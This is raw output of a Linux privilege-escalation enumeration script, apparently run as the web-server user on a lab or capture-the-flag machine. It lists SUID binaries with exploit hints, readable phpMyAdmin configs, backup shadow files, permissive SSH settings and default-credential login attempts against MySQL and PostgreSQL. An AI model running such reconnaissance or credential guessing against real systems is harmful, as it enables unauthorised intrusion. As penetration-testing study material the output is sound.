uid=108(mysql) gid=117(mysql) groups=117(mysql)
uid=109(ftp) gid=118(ftp) groups=118(ftp)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

[+] Login now
 22:57:04 up 33 min,  0 users,  load average: 0.00, 0.00, 0.00                    
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[+] Last logons
reboot   system boot  Fri Feb 17 10:23:28 2023   still running                         0.0.0.0
reboot   system boot  Wed Feb 15 12:00:46 2023   still running                         0.0.0.0
reboot   system boot  Sat Jan 28 09:57:35 2023   still running                         0.0.0.0
reboot   system boot  Thu Oct 27 08:17:27 2022   still running                         0.0.0.0
root     pts/0        Thu Jul  9 07:32:53 2020 - crash                    (840+00:44)  192.168.118.8
reboot   system boot  Thu Jul  9 07:20:15 2020   still running                         0.0.0.0
root     tty1         Thu Jul  2 13:53:53 2020 - down                      (00:02)     0.0.0.0
reboot   system boot  Thu Jul  2 13:52:39 2020 - Thu Jul  2 13:56:20 2020  (00:03)     0.0.0.0

wtmp begins Thu Jul  2 13:52:39 2020

[+] Last time logon each user
Username         Port     From             Latest                                 
root             pts/0    192.168.118.8    Thu Jul  9 07:32:53 -0700 2020

[+] Password policy
PASS_MAX_DAYS   99999                                                             
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512

[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)                                   
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                                   
                                                                                  

═══════════════════════════════════╣ Software Information ╠═══════════════════════════════════                                                                      
[+] MySQL version                                                                 
mysql  Ver 14.14 Distrib 5.7.17, for Linux (x86_64) using  EditLine wrapper       

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No                       
[+] MySQL connection using root/NOPASS ................. No                       
[+] Searching mysql credentials and exec                                          
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql   
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

[+] PostgreSQL version and pgadmin credentials
 Not Found                                                                        
                                                                                  
[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No          
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No          
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No          
                                                                                  
[+] Apache server info
Version: Server version: Apache/2.4.18 (Ubuntu)                                   
Server built:   2016-07-14T12:32:26
PHP exec extensions
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php-source

[+] Searching PHPCookies
 Not Found                                                                        
                                                                                  
[+] Searching Wordpress wp-config.php files
wp-config.php Not Found                                                           
                                                                                  
[+] Searching Drupal settings.php files
/default/settings.php Not Found                                                   
                                                                                  
[+] Searching Moodle config.php files
config.php inside a moodle folder Not Found                                       
                                                                                  
[+] Searching Tomcat users file
tomcat-users.xml Not Found                                                        
                                                                                  
[+] Mongo information
mongo binary Not Found                                                            
                                                                                  
[+] Searching supervisord configuration file
supervisord.conf Not Found                                                        
                                                                                  
[+] Searching cesi configuration file
cesi.conf Not Found                                                               
                                                                                  
[+] Searching Rsyncd config file
rsyncd.conf Not Found                                                             
[+] Searching Hostapd config file                                                 
hostapd.conf Not Found                                                            
                                                                                  
[+] Searching wifi conns file
 Not Found                                                                        
                                                                                  
[+] Searching Anaconda-ks config files
anaconda-ks.cfg Not Found                                                         
                                                                                  
[+] Searching .vnc directories and their passwd files
.vnc Not Found                                                                    
                                                                                  
[+] Searching ldap directories and their hashes
/etc/ldap                                                                         
The password hash is from the {SSHA} to 'structural'

[+] Searching .ovpn files and credentials
.ovpn Not Found                                                                   
                                                                                  
[+] Searching ssl/ssh files
Port 22                                                                           
PermitRootLogin yes
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

[+] Searching unexpected auth lines in /etc/pam.d/sshd
No                                                                                
                                                                                  
[+] Searching Cloud credentials (AWS, Azure, GC)
                                                                                  
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                              
/etc/exports Not Found                                                            
                                                                                  
[+] Searching kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                               
tickets kerberos Not Found                                                        
klist Not Found                                                                   
                                                                                  
[+] Searching Kibana yaml
kibana.yml Not Found                                                              
                                                                                  
[+] Searching Knock configuration
Knock.config Not Found                                                            
                                                                                  
[+] Searching logstash files
 Not Found                                                                        
                                                                                  
[+] Searching elasticsearch files
 Not Found                                                                        
                                                                                  
[+] Searching Vault-ssh files
vault-ssh-helper.hcl Not Found                                                    
                                                                                  
[+] Searching AD cached hashes
cached hashes Not Found                                                           
                                                                                  
[+] Searching screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                                 
screen Not Found                                                                  
                                                                                  
[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                                 
tmux Not Found                                                                    
                                                                                  
[+] Searching Couchdb directory
                                                                                  
[+] Searching redis.conf
                                                                                  
[+] Searching dovecot files
dovecot credentials Not Found                                                     
                                                                                  
[+] Searching mosquitto.conf
                                                                                  
[+] Searching neo4j auth file
                                                                                  
[+] Searching Cloud-Init conf file
                                                                                  
[+] Searching Erlang cookie file
                                                                                  
[+] Searching GVM auth file
                                                                                  
[+] Searching IPSEC files
                                                                                  
[+] Searching IRSSI files
                                                                                  
[+] Searching Keyring files
Keyring folder: /usr/share/keyrings                                               
/usr/share/keyrings:
total 20
-rw-r--r-- 1 root root 12335 May 18  2012 ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root     0 May 18  2012 ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root  1227 May 18  2012 ubuntu-master-keyring.gpg
Keyring folder: /var/lib/apt/keyrings
/var/lib/apt/keyrings:
total 16
-rw-r--r-- 1 root root 12335 Feb 15  2017 ubuntu-archive-keyring.gpg

[+] Searching Filezilla sites file
                                                                                  
[+] Searching backup-manager files
                                                                                  
[+] Searching uncommon passwd files (splunk)
                                                                                  
[+] Searching GitLab related files
                                                                                  

[+] Searching PGP/GPG
PGP/GPG software:                                                                 
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found                                                                  
                                                                                  
[+] Searching vim files
                                                                                  
[+] Checking if containerd(ctr) is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation                                                                 
                                                                                  
[+] Checking if runc is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation                                                                           
                                                                                  
[+] Searching docker files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket                                                                              
                                                                                  
[+] Interesting Firefox Files
[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox                                                                             
                                                                                  
[+] Interesting Chrome Files
[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox                                                                             
                                                                                  
[+] Autologin Files
                                                                                  


[+] S/Key authentication
                                                                                  
[+] YubiKey authentication
                                                                                  
[+] Passwords inside pam.d
                                                                                  
[+] FastCGI Params
                                                                                  

[+] SNMPs
                                                                                  


════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════                                                                       
[+] SUID - Check easy privesc, exploits and write perms                           
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid     
strings Not Found                                                                 
-rwsr-xr-x 1 root root        10K Feb 25  2014 /usr/lib/eject/dmcrypt-get-device  
-rwsr-xr-x 1 root root        44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root        44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root        53K Mar 29  2016 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)       
-rwsr-xr-x 1 root root        74K Mar 29  2016 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        40K Mar 29  2016 /usr/bin/chsh
-rwsr-xr-x 1 root root        49K Mar 29  2016 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root        39K Mar 29  2016 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root        40K Mar 29  2016 /bin/su
-rwsr-xr-x 1 root root        31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root       419K Aug 11  2016 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root        27K Dec 16  2016 /bin/umount  --->  BSD/Linux(08-1996)                                                                                
-rwsr-xr-x 1 root root        40K Dec 16  2016 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                      
-rwsr-xr-- 1 root messagebus  42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                          
-rwsr-xr-x 1 root root       134K Jan 20  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root       139K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)                         

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid     
-rwxr-sr-x 1 root mlocate  39K Nov 17  2014 /usr/bin/mlocate                      
-rwxr-sr-x 1 root tty      15K Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow   35K Mar 16  2016 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow   35K Mar 16  2016 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow   23K Mar 29  2016 /usr/bin/expiry
-rwxr-sr-x 1 root shadow   61K Mar 29  2016 /usr/bin/chage
-rwxr-sr-x 1 root crontab  36K Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root ssh     351K Aug 11  2016 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty      27K Dec 16  2016 /usr/bin/wall

[+] Checking misconfigurations of ld.so
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so             
/etc/ld.so.conf                                                                   
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities      
Current capabilities:                                                             
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities:
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep

[+] Users with capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities      
/etc/security/capability.conf Not Found                                           
                                                                                  
[+] Files with ACLs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls              
files with acls in searched folders Not Found                                     
                                                                                  
[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                                                             
/usr/bin/gettext.sh                                                               

[+] Unexpected in root
/vmlinuz                                                                          
/.bash_history
/lost+found
/initrd.img

[+] Files (scripts) in /etc/profile.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files    
total 16                                                                          
drwxr-xr-x  2 root root 4096 Mar 17  2017 .
drwxr-xr-x 90 root root 4096 Mar  6  2020 ..
-rw-r--r--  1 root root  663 May 18  2016 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

[+] Permissions in init, init.d, systemd, and rc.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d                                                                        
                                                                                  
[+] Hashes inside passwd file? ........... No
[+] Writable passwd file? ................ No                                     
[+] Credentials in fstab/mtab? ........... No                                     
[+] Can I read shadow files? ............. No                                     
[+] Can I read opasswd file? ............. No                                     
[+] Can I write in network-scripts? ...... No                                     
[+] Can I read root folder? .............. No                                     
                                                                                  
[+] Searching root files in home dirs (limit 30)
/home/                                                                            
/root/

[+] Searching folders owned by me containing others files on it
                                                                                  
[+] Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root www-data 8 Mar 17  2017 /etc/phpmyadmin/htpasswd.setup          
-rw-r----- 1 root www-data 509 Mar 17  2017 /etc/phpmyadmin/config-db.php
-rw-r----- 1 root www-data 509 Mar 17  2017 /var/lib/ucf/cache/:etc:phpmyadmin:config-db.php                                                                        
-rw-r----- 1 root www-data 60 Mar 17  2017 /var/lib/phpmyadmin/blowfish_secret.inc.php                                                                              
-rw-r----- 1 root www-data 0 Mar 17  2017 /var/lib/phpmyadmin/config.inc.php

[+] Modified interesting files in the last 5mins (limit 100)
/var/www/.gnupg/pubring.gpg                                                       
/var/www/.gnupg/trustdb.gpg
/var/www/.gnupg/gpg.conf
/var/log/auth.log
/var/log/kern.log
/var/log/syslog

[+] Writable log files (logrotten) (limit 100)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                                                                              
                                                                                  
[+] Files inside /home/www-data (limit 20)
                                                                                  
[+] Files inside others home (limit 20)
/home/btrisk/.sudo_as_admin_successful                                            
/home/btrisk/local.txt
/home/btrisk/.bash_history
/home/btrisk/.mysql_history
/home/btrisk/.viminfo
/home/btrisk/.profile
/home/btrisk/.bash_logout
/home/btrisk/.bashrc

[+] Searching installed mail applications
                                                                                  
[+] Mails (limit 50)
                                                                                  
[+] Backup folders
drwxr-xr-x 2 root root 4096 Mar  6  2020 /var/backups                             
total 988
-rw-r--r-- 1 root root    40960 Apr 26  2017 alternatives.tar.0
-rw-r--r-- 1 root root     1899 Mar 21  2017 alternatives.tar.1.gz
-rw-r--r-- 1 root root     1795 Mar 17  2017 alternatives.tar.2.gz
-rw-r--r-- 1 root root    11984 Feb 21  2020 apt.extended_states.0
-rw-r--r-- 1 root root     1369 Apr 26  2017 apt.extended_states.1.gz
-rw-r--r-- 1 root root     1361 Mar 21  2017 apt.extended_states.2.gz
-rw-r--r-- 1 root root     1295 Mar 21  2017 apt.extended_states.3.gz
-rw-r--r-- 1 root root     1277 Mar 17  2017 apt.extended_states.4.gz
-rw-r--r-- 1 root root       11 Mar 17  2017 dpkg.arch.0
-rw-r--r-- 1 root root       43 Mar 17  2017 dpkg.arch.1.gz
-rw-r--r-- 1 root root       43 Mar 17  2017 dpkg.arch.2.gz
-rw-r--r-- 1 root root       43 Mar 17  2017 dpkg.arch.3.gz
-rw-r--r-- 1 root root      450 Mar 21  2017 dpkg.diversions.0
-rw-r--r-- 1 root root      199 Mar 21  2017 dpkg.diversions.1.gz
-rw-r--r-- 1 root root      199 Mar 21  2017 dpkg.diversions.2.gz
-rw-r--r-- 1 root root      160 Mar 17  2017 dpkg.diversions.3.gz
-rw-r--r-- 1 root root      207 Mar 17  2017 dpkg.statoverride.0
-rw-r--r-- 1 root root      171 Mar 17  2017 dpkg.statoverride.1.gz
-rw-r--r-- 1 root root      171 Mar 17  2017 dpkg.statoverride.2.gz
-rw-r--r-- 1 root root      171 Mar 17  2017 dpkg.statoverride.3.gz
-rw-r--r-- 1 root root   469382 Apr 26  2017 dpkg.status.0
-rw-r--r-- 1 root root   133775 Mar 21  2017 dpkg.status.1.gz
-rw-r--r-- 1 root root   130805 Mar 21  2017 dpkg.status.2.gz
-rw-r--r-- 1 root root   129437 Mar 17  2017 dpkg.status.3.gz
-rw------- 1 root root      814 Mar 20  2017 group.bak
-rw------- 1 root shadow    684 Mar 20  2017 gshadow.bak
-rw------- 1 root root     1573 Mar 21  2017 passwd.bak
-rw------- 1 root shadow   1136 Apr 28  2017 shadow.bak

drwxr-xr-x 2 root root 4096 Apr  6  2016 /var/cache/dbconfig-common/backups
total 0


[+] Backup files
-rw-r--r-- 1 root root 26 Mar 17  2017 /etc/issue.backup                          
-rwxr-xr-x 1 root root 306 Feb 15  2017 /etc/rc.local.backup
-rw-r--r-- 1 root root 673 Mar 17  2017 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 610 Mar 17  2017 /etc/xml/catalog.old
-rw-r--r-- 1 root root 8710 Jan 18  2017 /lib/modules/4.4.0-62-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 8990 Jan 18  2017 /lib/modules/4.4.0-62-generic/kernel/drivers/power/wm831x_backup.ko
-rw-r--r-- 1 root root 128 Mar 17  2017 /var/lib/sgml-base/supercatalog.old
-rw-rw-r-- 1 btrisk 1000 2081 Oct 11  2016 /var/www/html/upload/modules/droplets/templates/backups.lte
-rw-r--r-- 1 root root 35792 May  8  2018 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 May  6  2015 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 10464 Mar 17  2017 /usr/share/info/dir.old
-rw-r--r-- 1 root root 1732 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-check.page
-rw-r--r-- 1 root root 2418 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-how.page
-rw-r--r-- 1 root root 2034 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-frequency.page
-rw-r--r-- 1 root root 1427 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-restore.page
-rw-r--r-- 1 root root 2308 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-where.page
-rw-r--r-- 1 root root 2530 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-what.page
-rw-r--r-- 1 root root 1298 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-why.page
-rw-r--r-- 1 root root 3094 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-thinkabout.page
-rw-r--r-- 1 root root 1720 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-check.page
-rw-r--r-- 1 root root 2392 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-how.page
-rw-r--r-- 1 root root 2018 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-frequency.page
-rw-r--r-- 1 root root 1422 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-restore.page
-rw-r--r-- 1 root root 2295 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-where.page
-rw-r--r-- 1 root root 2500 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-what.page
-rw-r--r-- 1 root root 1291 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-why.page
-rw-r--r-- 1 root root 3073 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-thinkabout.page
-rw-r--r-- 1 root root 974 Apr  7  2016 /usr/share/help-langpack/en_AU/deja-dup/backup-auto.page                                                                    
-rw-r--r-- 1 root root 755 Apr  7  2016 /usr/share/help-langpack/en_AU/deja-dup/backup-first.page                                                                   
-rw-r--r-- 1 root root 1720 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-check.page
-rw-r--r-- 1 root root 2371 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-how.page
-rw-r--r-- 1 root root 2020 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-frequency.page
-rw-r--r-- 1 root root 1420 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-restore.page
-rw-r--r-- 1 root root 2289 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-where.page
-rw-r--r-- 1 root root 2503 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-what.page
-rw-r--r-- 1 root root 1291 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-why.page
-rw-r--r-- 1 root root 3067 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-thinkabout.page
-rw-r--r-- 1 root root 974 Apr  7  2016 /usr/share/help-langpack/en_GB/deja-dup/backup-auto.page                                                                    
-rw-r--r-- 1 root root 755 Apr  7  2016 /usr/share/help-langpack/en_GB/deja-dup/backup-first.page                                                                   
-rw-r--r-- 1 root root 2543 Jun 24  2016 /usr/share/help-langpack/en_GB/evolution/backup-restore.page                                                               
-rw-r--r-- 1 root root 190058 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/.config.old
-rw-r--r-- 1 root root 0 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/include/config/net/team/mode/activebackup.h

[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)
                                                                                  
[+] Web files?(output limit)
/var/www/:                                                                        
total 28K
drwxrwxrwx  6 root     root     4.0K May 17 22:57 .
drwxr-xr-x 12 root     root     4.0K Mar 17  2017 ..
-rw-------  1 www-data www-data  466 Mar  6  2020 .bash_history
drwx------  2 www-data www-data 4.0K May 17 22:57 .gnupg
drwxrwxrwx  2 www-data www-data 4.0K May  2  2017 .nano
drwx------  2 www-data www-data 4.0K Apr 27  2017 .ssh
drwxrwxrwx  6 root     root     4.0K May 17 22:56 html


[+] Readable hidden interesting files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                                 
                                                                                  
[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)                                                                             
-rw-r--r-- 1 root root 102 Apr  5  2016 /etc/cron.weekly/.placeholder             
-rw-r----- 1 root root 12288 Apr 27  2017 /etc/.shadow.swp
-rw-r--r-- 1 root root 728 Feb 21  2020 /etc/init.d/.depend.start
-rw-r--r-- 1 root root 806 Feb 21  2020 /etc/init.d/.depend.stop
-rw-r--r-- 1 root root 978 Feb 21  2020 /etc/init.d/.depend.boot
-rw-r--r-- 1 root root 102 Apr  5  2016 /etc/cron.d/.placeholder
-rw-r--r-- 1 root root 102 Apr  5  2016 /etc/cron.hourly/.placeholder
-rw-r--r-- 1 root root 1391 Mar 17  2017 /etc/apparmor.d/cache/.features
-rw-r--r-- 1 root root 655 Jun 24  2016 /etc/skel/.profile
-rw-r--r-- 1 root root 220 Aug 31  2015 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc
-rw-r--r-- 1 root root 102 Apr  5  2016 /etc/cron.monthly/.placeholder
-rw-r--r-- 1 root root 102 Apr  5  2016 /etc/cron.daily/.placeholder
-rw------- 1 root root 0 Feb 15  2017 /etc/.pwd.lock
-rw------- 1 root root 23 Feb 20  2020 /.bash_history
-rw-r--r-- 1 root root 0 Feb 17 10:23 /run/network/.ifstate.lock
-rw-r--r-- 1 btrisk 1000 0 Mar 17  2017 /home/btrisk/.sudo_as_admin_successful
-rw------- 1 btrisk 1000 0 Jul  9  2020 /home/btrisk/.bash_history
-rw------- 1 btrisk 1000 0 Mar  6  2020 /home/btrisk/.mysql_history
-rw------- 1 btrisk 1000 586 Mar 21  2017 /home/btrisk/.viminfo
-rw-r--r-- 1 btrisk 1000 655 Mar 17  2017 /home/btrisk/.profile
-rw-r--r-- 1 btrisk 1000 220 Mar 17  2017 /home/btrisk/.bash_logout
-rw-r--r-- 1 btrisk 1000 3771 Mar 17  2017 /home/btrisk/.bashrc
-rw-r--r-- 1 root root 1182 Mar 17  2017 /var/lib/apparmor/profiles/.apparmor.md5sums
-rw-rw-r-- 1 btrisk 1000 194 Oct 12  2016 /var/www/html/wordpress/wp-content/plugins/akismet/.htaccess
-rw-rw-r-- 1 btrisk 1000 13 Oct 11  2016 /var/www/html/upload/modules/tiny_mce_4/tiny_mce/filemanager/config/.htaccess
-rw-rw-r-- 1 btrisk 1000 876 Oct 11  2016 /var/www/html/upload/modules/lib_phpmailer/phpmailer/.travis.yml
-rw-rw-r-- 1 btrisk 1000 3627 Oct 11  2016 /var/www/html/upload/modules/lib_phpmailer/phpmailer/.scrutinizer.yml
-rw------- 1 www-data www-data 466 Mar  6  2020 /var/www/.bash_history
-rw-r--r-- 1 root root 7080 Mar 28  2016 /usr/share/php/.filemap
-rw-r--r-- 1 root root 0 Mar 28  2016 /usr/share/php/.lock
-rw-r--r-- 1 root root 2439 Mar 28  2016 /usr/share/php/.depdb
-rw-r--r-- 1 root root 0 Mar 28  2016 /usr/share/php/.depdblock
-rw-r--r-- 1 root root 190058 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/.config.old
-rw-r--r-- 1 root root 22 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/.17323.d
-rw-r--r-- 1 root root 14210 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/kernel/.bounds.s.cmd
-rw-r--r-- 1 root root 820 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/.missing-syscalls.d
-rw-r--r-- 1 root root 2839 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/selinux/mdp/.mdp.cmd
-rw-r--r-- 1 root root 3239 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/selinux/genheaders/.genheaders.cmd
-rw-r--r-- 1 root root 153 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/genksyms/.genksyms.cmd
-rw-r--r-- 1 root root 2719 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/genksyms/.genksyms.o.cmd
-rw-r--r-- 1 root root 3347 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/genksyms/.lex.lex.o.cmd
-rw-r--r-- 1 root root 2481 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/genksyms/.parse.tab.o.cmd
-rw-r--r-- 1 root root 2380 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/.kallsyms.cmd
-rw-r--r-- 1 root root 4495 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/.extract-cert.cmd
-rw-r--r-- 1 root root 3972 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/.insert-sys-cert.cmd
-rw-r--r-- 1 root root 5133 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/.sign-file.cmd
-rw-r--r-- 1 root root 3253 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/.asn1_compiler.cmd
-rw-r--r-- 1 root root 4268 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/basic/.fixdep.cmd
-rw-r--r-- 1 root root 1193 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/basic/.bin2c.cmd
-rw-r--r-- 1 root root 2391 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/.conmakehash.cmd
-rw-r--r-- 1 root root 3568 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/.sortextable.cmd
-rw-r--r-- 1 root root 2289 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.empty.o.cmd
-rw-r--r-- 1 root root 5191 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.devicetable-offsets.s.cmd
-rw-r--r-- 1 root root 4622 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.modpost.o.cmd
-rw-r--r-- 1 root root 3485 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.file2alias.o.cmd
